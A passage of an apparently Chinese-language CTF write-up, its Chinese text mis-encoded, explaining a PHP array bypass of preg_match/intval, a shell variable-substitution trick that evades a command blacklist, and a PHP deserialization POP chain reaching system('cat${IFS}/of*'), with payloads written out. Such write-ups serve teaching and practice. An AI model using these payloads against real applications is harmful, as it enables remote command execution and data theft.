å‡½æ•°ä¼šç»ˆæ­¢è„šæœ¬æ‰§è¡Œï¼Œå¹¶è¾“å‡ºæŒ‡å®šçš„å­—ç¬¦ä¸²ã€‚</p></li></ul></li></ul><p>ç¬¬äºŒéƒ¨åˆ†ï¼šæ•´æ•°æ£€æŸ¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;OK,æ¥ä¸‹æ¥ä½ çŸ¥é“è¯¥æ€ä¹ˆåšå—&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>**<code>intval($inputNumber)</code>**ï¼š</p><ul><li><p>è¿™ä¸ªå‡½æ•°ä¼šå°† <code>$inputNumber</code> è½¬æ¢ä¸ºæ•´æ•°ã€‚</p></li><li><p>å¦‚æœ <code>$inputNumber</code> è½¬æ¢ä¸ºæ•´æ•°åçš„å€¼ä¸ä¸º 0ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸã€‚</p></li><li><p>å¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œä¼šè¾“å‡º <code>&quot;OK,æ¥ä¸‹æ¥ä½ çŸ¥é“è¯¥æ€ä¹ˆåšå—&quot;</code>ã€‚</p></li></ul></li></ul><p>Number[]&#x3D;1;åˆ©ç”¨æ•°ç»„ç»•è¿‡ï¼›<br>åŸç†è§£é‡Š</p><p>å½“æˆ‘ä»¬ä½¿ç”¨Â <code>Number[]=1</code>Â æ—¶ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹è¿‡ç¨‹ï¼š</p><ol><li><p><strong>æ•°ç»„ä¼ å…¥ï¼š</strong></p><ul><li><code>$_REQUEST[&#39;Number&#39;]</code>Â æ¥æ”¶åˆ°çš„æ˜¯ä¸€ä¸ªæ•°ç»„Â <code>array(1)</code></li><li>è€Œä¸æ˜¯å­—ç¬¦ä¸² â€œ1â€</li></ul></li><li><p><strong>æ­£åˆ™æ£€æŸ¥ç»•è¿‡ï¼š</strong></p><ul><li><code>preg_match()</code>Â å‡½æ•°åœ¨å¤„ç†æ•°ç»„æ—¶ä¼šæŠ¥ Warning</li><li>ç”±äºÂ <code>error_reporting(0)</code>Â é”™è¯¯è¢«æŠ‘åˆ¶</li><li><code>preg_match()</code>Â è¿”å›Â <code>false</code>ï¼Œä¸ä¼šè§¦å‘ die()</li></ul></li><li><p><strong>intval() è½¬æ¢ï¼š</strong></p><ul><li><code>intval()</code>Â å¯¹æ•°ç»„çš„å¤„ç†ä¼šè¿”å› 1</li><li>è¿™æ˜¯å› ä¸º PHP åœ¨å°†æ•°ç»„è½¬æ¢ä¸ºæ•´æ•°æ—¶çš„é»˜è®¤è¡Œä¸º</li><li>æ‰€ä»¥èƒ½å¤Ÿé€šè¿‡Â <code>if (intval($inputNumber))</code>Â çš„æ£€æŸ¥</li></ul><h5 id="cmdå‚æ•°"><a href="#cmdå‚æ•°" class="headerlink" title="cmdå‚æ•°"></a>cmdå‚æ•°</h5><p> é»‘åå•è¿‡æ»¤ä¸€å †ï¼›ä½¿ç”¨å‘½ä»¤æ›¿æ¢å’Œå˜é‡æ›¿æ¢çš„æŠ€å·§ï¼Œæœ€ç»ˆç”Ÿæˆäº†ä¸€ä¸ªç‰¹å®šçš„æ–‡ä»¶è·¯å¾„ï¼›</p><ol><li><strong>å˜é‡èµ‹å€¼éƒ¨åˆ†</strong><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd=a=c;b=at;c=f;d=lag;e=t;f=xt;g=l;h=s;i=h;j=ead;k=$($g<span class="variable">$h</span> -a | $i<span class="variable">$j</span> -n 1);$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure></li></ol><ul><li><code>a=c;</code>ï¼šå°†å˜é‡ <code>a</code> èµ‹å€¼ä¸º <code>c</code>ã€‚</li><li><code>b=at;</code>ï¼šå°†å˜é‡ <code>b</code> èµ‹å€¼ä¸º <code>at</code>ã€‚</li><li><code>c=f;</code>ï¼šå°†å˜é‡ <code>c</code> èµ‹å€¼ä¸º <code>f</code>ã€‚</li><li><code>d=lag;</code>ï¼šå°†å˜é‡ <code>d</code> èµ‹å€¼ä¸º <code>lag</code>ã€‚</li><li><code>e=t;</code>ï¼šå°†å˜é‡ <code>e</code> èµ‹å€¼ä¸º <code>t</code>ã€‚</li><li><code>f=xt;</code>ï¼šå°†å˜é‡ <code>f</code> èµ‹å€¼ä¸º <code>xt</code>ã€‚</li><li><code>g=l;</code>ï¼šå°†å˜é‡ <code>g</code> èµ‹å€¼ä¸º <code>l</code>ã€‚</li><li><code>h=s;</code>ï¼šå°†å˜é‡ <code>h</code> èµ‹å€¼ä¸º <code>s</code>ã€‚</li><li><code>i=h;</code>ï¼šå°†å˜é‡ <code>i</code> èµ‹å€¼ä¸º <code>h</code>ï¼Œå³ <code>i=s</code>ã€‚</li><li><code>j=ead;</code>ï¼šå°†å˜é‡ <code>j</code> èµ‹å€¼ä¸º <code>ead</code>ã€‚</li><li><code>k=$($g$h -a | $i$j -n 1);</code>ï¼šè¿™éƒ¨åˆ†æ˜¯å…³é”®ï¼Œ<code>$g$h</code> è¢«æ›¿æ¢ä¸º <code>ls</code>ï¼Œ<code>$i$j</code> è¢«æ›¿æ¢ä¸º <code>head</code>ã€‚å› æ­¤ï¼Œ<code>k=$(ls -a | head -n 1)</code>ï¼Œå³ <code>k</code> çš„å€¼æ˜¯ <code>ls -a</code> å‘½ä»¤è¾“å‡ºçš„ç¬¬ä¸€è¡Œå†…å®¹ã€‚</li><li><code>$a$b</code>ï¼š<code>$a</code> æ˜¯ <code>c</code>ï¼Œ<code>$b</code> æ˜¯ <code>at</code>ï¼Œå› æ­¤ <code>$a$b</code> æ˜¯ <code>cat</code>ã€‚</li></ul></li><li><p><strong>æœ€ç»ˆå‘½ä»¤éƒ¨åˆ†</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/$c$d$k$e<span class="variable">$f</span></span><br></pre></td></tr></table></figure><ul><li><code>$c</code> æ˜¯ <code>f</code>ï¼Œ<code>$d</code> æ˜¯ <code>lag</code>ï¼Œ<code>$k</code> æ˜¯ <code>ls -a</code> è¾“å‡ºçš„ç¬¬ä¸€è¡Œå†…å®¹ï¼Œ<code>$e</code> æ˜¯ <code>t</code>ï¼Œ<code>$f</code> æ˜¯ <code>xt</code>ã€‚</li><li>å› æ­¤ï¼Œ<code>/$c$d$k$e$f</code> è¢«æ›¿æ¢ä¸º <code>/flag$ktxt</code>ã€‚</li></ul></li><li><p><strong>ç»“åˆå˜é‡å’Œå‘½ä»¤æ›¿æ¢</strong></p><ul><li>æœ€ç»ˆçš„å‘½ä»¤æ˜¯ï¼š<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /flag$(<span class="built_in">ls</span> -a | <span class="built_in">head</span> -n 1)txt</span><br></pre></td></tr></table></figure></li></ul></li></ol><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>postæäº¤ä¸­ï¼š<br>Numbwe[]&#x3D;1&amp;cmd&#x3D;a&#x3D;c;b&#x3D;at;c&#x3D;f;d&#x3D;lag;e&#x3D;t;f&#x3D;xt;g&#x3D;l;h&#x3D;s;i&#x3D;h;j&#x3D;ead;k&#x3D;$($g$h -a | $i$j -n 1);$a$b &#x2F;$c$d$k$e$f</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>1.æ•°ç»„ç»•è¿‡æ­£åˆ™å’Œintval();<br>2.ä½¿ç”¨å‘½ä»¤æ›¿æ¢å’Œå˜é‡æ›¿æ¢çš„æŠ€å·§ï¼Œæœ€ç»ˆç”Ÿæˆäº†ä¸€ä¸ªç‰¹å®šçš„æ–‡ä»¶è·¯å¾„,ç»•è¿‡å‘½ä»¤è¿‡æ»¤<br>3.ä¸ºä»€ä¹ˆèƒ½å–å‡ºä¸€ä¸ªç‚¹</p><ul><li><code>ls -a</code> çš„è¾“å‡ºä¸­ï¼Œç¬¬ä¸€è¡Œé€šå¸¸æ˜¯ <code>.</code>ï¼ˆå½“å‰ç›®å½•ï¼‰ã€‚</li><li>å› æ­¤ï¼Œ<code>k=$(ls -a | head -n 1)</code> çš„å€¼æ˜¯ <code>.</code>ã€‚</li><li>æœ€ç»ˆå‘½ä»¤ä¸­ï¼Œ<code>/flag$(ls -a | head -n 1)txt</code> è¢«æ›¿æ¢ä¸º <code>/flag.txt</code>ï¼Œå…¶ä¸­ <code>.</code> æ˜¯ <code>ls -a</code> è¾“å‡ºçš„ç¬¬ä¸€è¡Œå†…å®¹ã€‚</li></ul><h3 id="ez-phpé¢˜ç›®"><a href="#ez-phpé¢˜ç›®" class="headerlink" title="ez_phpé¢˜ç›®"></a>ez_phpé¢˜ç›®</h3><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span>Â <span class="title">GOGOGO</span></span>&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">public</span>Â <span class="variable">$dengchao</span>;  </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">function</span>Â <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;GoÂ GoÂ Go~Â å‡ºå‘å–½ï¼&quot;</span>Â .Â <span class="variable language_">$this</span>-&gt;dengchao;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span>Â <span class="title">DouBao</span></span>&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">public</span>Â <span class="variable">$dao</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">public</span>Â <span class="variable">$Dagongren</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">public</span>Â <span class="variable">$Bagongren</span>;  </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">function</span>Â <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(Â (<span class="variable language_">$this</span>-&gt;DagongrenÂ !=Â <span class="variable language_">$this</span>-&gt;Bagongren)Â &amp;&amp;Â (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Dagongren)Â ===Â <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Bagongren))Â &amp;&amp;Â (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Dagongren)===Â <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Bagongren))Â )&#123;Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;dao,Â [<span class="string">&#x27;è¯—äººæˆ‘åƒï¼&#x27;</span>]);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span>Â <span class="title">HeiCaFei</span></span>&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">public</span>Â <span class="variable">$HongCaFei</span>;  </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">function</span>Â <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,Â <span class="variable">$arguments</span></span>)</span>&#123;Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei,Â [<span class="number">0</span>Â =&gt;Â <span class="variable">$name</span>]);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__">Â </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]))Â &#123;Â Â Â Â </span><br><span class="line"><span class="variable">$tempÂ </span>=Â <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);  </span><br><span class="line">Â Â Â Â <span class="keyword">throw</span><span class="title function_ invoke__">Â newÂ Exception</span>(<span class="string">&#x27;WhatÂ doÂ youÂ wantÂ toÂ do?&#x27;</span>);  </span><br><span class="line">&#125;Â <span class="keyword">else</span>Â &#123;Â Â Â Â <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><h4 id="è§‚å¯ŸPHPä»£ç "><a href="#è§‚å¯ŸPHPä»£ç " class="headerlink" title="è§‚å¯ŸPHPä»£ç "></a>è§‚å¯ŸPHPä»£ç </h4><p>æ— ç›´æ¥flagæ–‡ä»¶è¾“å‡ºï¼Œä½†å­˜åœ¨å¯æ§å‚æ•°dataï¼›<br>dataè¢«ååºåˆ—åŒ–ï¼›<br>ååºåˆ—åŒ–ä¸€å®šè§¦å‘_destruct()åˆ›å»ºå¯¹è±¡åé”€æ¯ï¼Œ<br>æŸ¥çœ‹gogogoç±»çš„destructæ–¹æ³•<br>è¾“å‡ºå­—ç¬¦ä¸²ä¸”æ‹¼æ¥$dengchaoï¼›<br>åˆç¬¬äºŒç±»ä¸­å­˜åœ¨_ToStringæ–¹æ³•<br>å°†ç¬¬äºŒä¸ªç±»çš„å®ä¾‹åŒ–èµ‹å€¼ç»™$dengchaoï¼Œè§¦å‘tostringæ–¹æ³•<br>æƒ³è¦æ‰§è¡Œcall_user_func_arrayï¼Œéœ€è¦ç»•è¿‡</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(Â ($<span class="keyword">this</span>-&gt;DagongrenÂ !=Â $<span class="keyword">this</span>-&gt;Bagongren)Â &amp;&amp;Â (md5($<span class="keyword">this</span>-&gt;Dagongren)Â ===Â md5($<span class="keyword">this</span>-&gt;Bagongren))Â &amp;&amp;Â (sha1($<span class="keyword">this</span>-&gt;Dagongren)===Â sha1($<span class="keyword">this</span>-&gt;Bagongren))Â )</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹åªéœ€è¦ä½¿ç”¨æ•°ç»„å³å¯ç»•è¿‡ã€‚ä½†æ˜¯è¿™é‡Œæ˜¯åœ¨ç±»é‡Œé¢ï¼Œæˆ‘ä»¬å½“ç„¶ä¸èƒ½è¿™ä¹ˆåšã€‚<br>è¿™é‡Œçš„è€ƒç‚¹æ˜¯md5ï¼ˆï¼‰å’Œsha1ï¼ˆï¼‰å¯ä»¥å¯¹ä¸€ä¸ªç±»è¿›è¡Œhashï¼Œå¹¶ä¸”ä¼šè§¦å‘è¿™ä¸ªç±»çš„ æ–¹æ³•;ï¼Œä¹Ÿä¼šè§¦å‘è¿™ä¸ªç±»é‡Œçš„æ–¹æ³•ã€‚<code>__toString</code><br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å«æœ‰Â æ–¹æ³•çš„PHPå†…ç½®ç±»æ¥ç»•è¿‡ï¼Œç”¨çš„ä¸¤ä¸ªæ¯”è¾ƒå¤šçš„å†…ç½®ç±»å°±æ˜¯__toStringÂ å’Œ<code>Exception</code>Â ï¼Œä»–ä»¬ä¹‹ä¸­æœ‰ä¸€ä¸ªÂ æ–¹æ³•ï¼Œå½“ç±»è¢«å½“åšå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>, <span class="number">1</span>);<span class="variable">$test2</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>tips:æ”¾ç½®äºåŒä¸€è¡Œï¼›</p><h3 id="å…³é”®ç‚¹ï¼šcall-user-func-array-çš„è¡Œä¸º"><a href="#å…³é”®ç‚¹ï¼šcall-user-func-array-çš„è¡Œä¸º" class="headerlink" title="å…³é”®ç‚¹ï¼šcall_user_func_array çš„è¡Œä¸º"></a><strong>å…³é”®ç‚¹ï¼š<code>call_user_func_array</code> çš„è¡Œä¸º</strong></h3><p>åœ¨PHPä¸­ï¼Œ<code>call_user_func_array</code> å‡½æ•°ç”¨äºè°ƒç”¨ä¸€ä¸ªå¯è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå¹¶å°†å‚æ•°æ•°ç»„ä¼ é€’ç»™å®ƒã€‚å›è°ƒå‡½æ•°å¯ä»¥æ˜¯ä¸€ä¸ªæ™®é€šçš„å‡½æ•°ã€ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•ã€ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªå¯¹è±¡çš„é­”æœ¯æ–¹æ³•ã€‚</p><h4 id="b-dao-çš„ç»“æ„"><a href="#b-dao-çš„ç»“æ„" class="headerlink" title="$b-&gt;dao çš„ç»“æ„"></a><strong><code>$b-&gt;dao</code> çš„ç»“æ„</strong></h4><p>åœ¨ä»£ç ä¸­ï¼Œ<code>$b-&gt;dao</code> è¢«è®¾ç½®ä¸ºä¸€ä¸ªæ•°ç»„ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;dao = [<span class="variable">$c1</span>, <span class="string">&#x27;test&#x27;</span>];</span><br></pre></td></tr></table></figure><p>è¿™æ„å‘³ç€ <code>$b-&gt;dao</code> æ˜¯ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªå…ƒç´ çš„æ•°ç»„ï¼š</p><ol><li><code>$c1</code>ï¼šä¸€ä¸ª <code>HeiCaFei</code> ç±»çš„å®ä¾‹ã€‚</li><li><code>&#39;test&#39;</code>ï¼šä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–¹æ³•åã€‚</li></ol><h4 id="call-user-func-array-çš„è°ƒç”¨"><a href="#call-user-func-array-çš„è°ƒç”¨" class="headerlink" title="call_user_func_array çš„è°ƒç”¨"></a><strong><code>call_user_func_array</code> çš„è°ƒç”¨</strong></h4><p>å½“ <code>call_user_func_array($this-&gt;dao, [&#39;è¯—â¼ˆæˆ‘åƒï¼&#39;])</code> è¢«è°ƒç”¨æ—¶ï¼Œ<code>$this-&gt;dao</code> çš„å€¼æ˜¯ <code>[$c1, &#39;test&#39;]</code>ã€‚<code>call_user_func_array</code> ä¼šå°è¯•è°ƒç”¨ <code>$c1</code> çš„ <code>test</code> æ–¹æ³•ï¼Œå¹¶å°† <code>[&#39;è¯—â¼ˆæˆ‘åƒï¼&#39;]</code> ä½œä¸ºå‚æ•°ä¼ é€’ã€‚</p><h4 id="HeiCaFei-ç±»çš„-call-æ–¹æ³•"><a href="#HeiCaFei-ç±»çš„-call-æ–¹æ³•" class="headerlink" title="HeiCaFei ç±»çš„ __call æ–¹æ³•"></a><strong><code>HeiCaFei</code> ç±»çš„ <code>__call</code> æ–¹æ³•</strong></h4><p><code>HeiCaFei</code> ç±»å®šä¹‰äº†ä¸€ä¸ª <code>__call</code> æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__call</code> æ–¹æ³•æ˜¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œç”¨äºå¤„ç†å¯¹æœªå®šä¹‰æ–¹æ³•çš„è°ƒç”¨ã€‚å½“å°è¯•è°ƒç”¨ <code>$c1</code> çš„ <code>test</code> æ–¹æ³•æ—¶ï¼Œç”±äº <code>HeiCaFei</code> ç±»ä¸­å¹¶æ²¡æœ‰å®šä¹‰ <code>test</code> æ–¹æ³•ï¼ŒPHPä¼šè‡ªåŠ¨è°ƒç”¨ <code>__call</code> æ–¹æ³•ã€‚</p><h4 id="call-æ–¹æ³•çš„é€»è¾‘"><a href="#call-æ–¹æ³•çš„é€»è¾‘" class="headerlink" title="__call æ–¹æ³•çš„é€»è¾‘"></a><strong><code>__call</code> æ–¹æ³•çš„é€»è¾‘</strong></h4><p>åœ¨ <code>__call</code> æ–¹æ³•ä¸­ï¼š</p><ul><li><code>$name</code> æ˜¯è¢«è°ƒç”¨çš„æ–¹æ³•åï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯ <code>&#39;test&#39;</code>ï¼‰ã€‚</li><li><code>$arguments</code> æ˜¯ä¼ é€’ç»™è¯¥æ–¹æ³•çš„å‚æ•°æ•°ç»„ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯ <code>[&#39;è¯—â¼ˆæˆ‘åƒï¼&#39;]</code>ï¼‰ã€‚</li></ul><p><code>__call</code> æ–¹æ³•çš„å®ç°æ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]);</span><br></pre></td></tr></table></figure><p>è¿™æ„å‘³ç€å®ƒä¼šè°ƒç”¨ <code>$this-&gt;HongCaFei</code>ï¼Œå¹¶å°† <code>$name</code>ï¼ˆå³ <code>&#39;test&#39;</code>ï¼‰ä½œä¸ºå‚æ•°ä¼ é€’ã€‚</p><h4 id="c1-HongCaFei-çš„ç»“æ„"><a href="#c1-HongCaFei-çš„ç»“æ„" class="headerlink" title="$c1-&gt;HongCaFei çš„ç»“æ„"></a><strong><code>$c1-&gt;HongCaFei</code> çš„ç»“æ„</strong></h4><p><code>$c1-&gt;HongCaFei</code> è¢«è®¾ç½®ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c1</span>-&gt;HongCaFei = [<span class="variable">$c2</span>, <span class="string">&quot;cat\$&#123;IFS&#125;/of*&quot;</span>];</span><br></pre></td></tr></table></figure><p>è¿™æ„å‘³ç€ <code>$c1-&gt;HongCaFei</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«ä¸¤ä¸ªå…ƒç´ ï¼š</p><ol><li><code>$c2</code>ï¼šå¦ä¸€ä¸ª <code>HeiCaFei</code> ç±»çš„å®ä¾‹ã€‚</li><li><code>&quot;cat\$&#123;IFS&#125;/of*&quot;</code>ï¼šä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</li></ol><h4 id="æœ€ç»ˆè°ƒç”¨"><a href="#æœ€ç»ˆè°ƒç”¨" class="headerlink" title="æœ€ç»ˆè°ƒç”¨"></a><strong>æœ€ç»ˆè°ƒç”¨</strong></h4><p>å½“ <code>call_user_func_array($this-&gt;HongCaFei, [0 =&gt; $name])</code> è¢«è°ƒç”¨æ—¶ï¼Œå®ƒä¼šå°è¯•è°ƒç”¨ <code>$c2</code> çš„ <code>&quot;cat\$&#123;IFS&#125;/of*&quot;</code> æ–¹æ³•ï¼Œå¹¶å°† <code>&#39;test&#39;</code> ä½œä¸ºå‚æ•°ä¼ é€’ã€‚</p><p>ç”±äº <code>$c2-&gt;HongCaFei</code> è¢«è®¾ç½®ä¸º <code>&quot;system&quot;</code>ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c2</span>-&gt;HongCaFei = <span class="string">&quot;system&quot;</span>;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆä¼šè°ƒç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;system&quot;</span>, [<span class="string">&quot;cat\$&#123;IFS&#125;/of*&quot;</span>]);</span><br></pre></td></tr></table></figure><p>è¿™ç›¸å½“äºæ‰§è¡Œäº†ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat\$&#123;IFS&#125;/of*&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><ul><li><strong><code>$b-&gt;dao</code> çš„ç»“æ„</strong>ï¼š<code>[$c1, &#39;test&#39;]</code> è¡¨ç¤ºè°ƒç”¨ <code>$c1</code> çš„ <code>test</code> æ–¹æ³•ã€‚</li><li><strong><code>__call</code> çš„è§¦å‘</strong>ï¼šç”±äº <code>HeiCaFei</code> ç±»ä¸­æ²¡æœ‰å®šä¹‰ <code>test</code> æ–¹æ³•ï¼ŒPHPä¼šè°ƒç”¨ <code>__call</code> æ–¹æ³•ã€‚</li><li><strong><code>__call</code> çš„é€»è¾‘</strong>ï¼š<code>__call</code> æ–¹æ³•ä¼šè°ƒç”¨ <code>$this-&gt;HongCaFei</code>ï¼Œå¹¶å°† <code>&#39;test&#39;</code> ä½œä¸ºå‚æ•°ä¼ é€’ã€‚</li><li><strong>æœ€ç»ˆè°ƒç”¨</strong>ï¼šé€šè¿‡ä¸€ç³»åˆ—çš„è°ƒç”¨ï¼Œæœ€ç»ˆè§¦å‘ <code>system(&quot;cat\$&#123;IFS&#125;/of*&quot;)</code>ã€‚</li></ul><h4 id="åºåˆ—åŒ–å’Œè¾“å‡º"><a href="#åºåˆ—åŒ–å’Œè¾“å‡º" class="headerlink" title="åºåˆ—åŒ–å’Œè¾“å‡º"></a><strong>åºåˆ—åŒ–å’Œè¾“å‡º</strong></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pop</span> = <span class="keyword">array</span>(<span class="variable">$a</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i%3A1%3Bi%3A0%3B%7D&quot;</span>, <span class="string">&quot;i%3A1%3Bi%3A0%3B&quot;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>)));</span><br></pre></td></tr></table></figure><ul><li><p><strong>ä½œç”¨</strong>ï¼šå°† <code>$a</code> å’Œ <code>0</code> æ”¾å…¥æ•°ç»„ <code>$pop</code>ï¼Œç„¶ååºåˆ—åŒ–å¹¶è¾“å‡ºã€‚</p></li><li><p><strong>å…³é”®ç‚¹</strong>ï¼šé€šè¿‡ <code>str_replace</code> æ›¿æ¢åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œé¿å…æŸäº›è¿‡æ»¤å™¨çš„æ£€æµ‹ã€‚</p></li></ul><h4 id="popé“¾"><a href="#popé“¾" class="headerlink" title="popé“¾"></a>popé“¾</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$dengchao</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Go Go Go~ å‡ºå‘å–½ï¼&quot;</span> . <span class="variable language_">$this</span>-&gt;dengchao;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$dao</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$Dagongren</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$Bagongren</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;Dagongren != <span class="variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Dagongren)</span><br><span class="line">=== <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Dagongren)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-</span><br><span class="line">&gt;Bagongren)) )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span 